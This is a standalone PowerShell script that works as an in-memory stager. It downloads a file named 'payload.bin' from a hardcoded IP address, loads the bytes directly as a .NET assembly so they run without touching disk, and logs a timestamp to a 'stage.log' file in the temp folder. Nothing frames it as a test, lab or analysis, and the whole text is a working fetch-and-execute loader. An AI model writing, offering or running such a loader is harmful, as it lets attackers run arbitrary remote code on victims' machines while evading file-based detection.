
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://203.0.113.30/payload.bin"
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($TransferUrl)
[Reflection.Assembly]::Load($ManagedBytes)
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
